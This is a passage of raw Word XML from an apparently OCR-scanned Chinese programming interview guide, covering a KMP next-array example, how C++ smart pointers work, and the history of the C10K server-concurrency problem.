          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">卩 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>gIhiIj</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="890"/>
          <w:tab w:val="left" w:pos="1643"/>
          <w:tab w:val="left" w:pos="2080"/>
          <w:tab w:val="left" w:pos="2573"/>
          <w:tab w:val="left" w:pos="2978"/>
          <w:tab w:val="left" w:pos="3383"/>
          <w:tab w:val="left" w:pos="3743"/>
          <w:tab w:val="left" w:pos="4088"/>
          <w:tab w:val="left" w:pos="4545"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="bookmark40"/>
      <w:bookmarkEnd w:id="34"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>index</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5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="890"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="35" w:name="bookmark41"/>
      <w:bookmarkEnd w:id="35"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>str: a b a b a b a c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="890"/>
          <w:tab w:val="left" w:pos="1643"/>
          <w:tab w:val="left" w:pos="2080"/>
          <w:tab w:val="left" w:pos="2573"/>
          <w:tab w:val="left" w:pos="2978"/>
          <w:tab w:val="left" w:pos="3383"/>
          <w:tab w:val="left" w:pos="3743"/>
          <w:tab w:val="left" w:pos="4088"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="960" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="600"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="bookmark42"/>
      <w:bookmarkEnd w:id="36"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next：</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4 -1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="468"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="bookmark45"/>
      <w:bookmarkEnd w:id="37"/>
      <w:bookmarkStart w:id="38" w:name="bookmark43"/>
      <w:bookmarkStart w:id="39" w:name="bookmark44"/>
      <w:bookmarkStart w:id="40" w:name="bookmark46"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>智能指针的实现原理？</w:t>
      </w:r>
      <w:bookmarkEnd w:id="38"/>
      <w:bookmarkEnd w:id="39"/>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>智能指针的基本原理就是将指针通过对象去管理，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">的操作利用析构函数执行， 而析构函数的调用是根据这个对象的作用域来确定的,离开了作用域，析构函数被调用。 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的操作也将被执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="468"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="bookmark49"/>
      <w:bookmarkEnd w:id="41"/>
      <w:bookmarkStart w:id="42" w:name="bookmark47"/>
      <w:bookmarkStart w:id="43" w:name="bookmark48"/>
      <w:bookmarkStart w:id="44" w:name="bookmark50"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>请解释什么是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C1OK</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>问题，后来是怎么解决的？</w:t>
      </w:r>
      <w:bookmarkEnd w:id="42"/>
      <w:bookmarkEnd w:id="43"/>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="695"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="45" w:name="bookmark51"/>
      <w:bookmarkEnd w:id="45"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C10K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>问题</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="305" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>互联网还不够普及，用户也不多。一台服务器同时在线100个用户估计在当时已经算是 大型应用了。所以并不存在什么</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C10K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的谁題。互联网的爆发期应该是在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ww</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>网站，浏 览器，雅虎出现后。最早的互联网称之为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Webl.O,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>互联网大部分的使用场景是下载一 个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>页面，用户在浏览器中查看网页上的信息。这个时期也不存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C10K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>问题。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Web2.0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>时代到来后就不同了，一方面是普及率大大提高了，用户群体几何倍増长。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">另 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>一方面是互联网不再是单纯的浏览万维网网页，逐渐开始进行交互，而且应用程序的逻 辑也变的更复杂，从简单的表单提交，到即时通信和在线实时互动。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C10K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的问题才体 现出来了。每一个用户都必须与服务署保持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>KT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">连接才能进行实时的数据交互。 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Facebook</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这样的网站同一时间的并发</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>连接可能会过亿。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>腾讯</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>QQ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>也是有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C10K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">问题的，只不过他们是用了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这种原始的包交换协议来实现的, 绕开了这个难题。当然过程肯定是痛苦的。如果当时有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>epoll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>技术，他们肯定会用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">TCPo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>后来的手机</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>QQ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>,微信都采用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>协议。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这时候问题就来了，最初的服务器都是基于进程/线程模型的，新到来一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>"P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>连接， 就需要分配1个进程（或者线程）。而进程又是操作系统最昂贵的资源，一台机器无法 创建很多进程。如果是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C10K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就要创建1万个进程，那么操作系统是无法承受的。如果 是采用分布式系统，维持1亿用户在线需要10万台服务器，成本巨大,也只有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Facebook,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Google</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，雅虎才有财力购买如此多的服务器。这就是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C10K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>问题的本质。</w:t>
      </w:r>
    </w:p>
    <w:p>
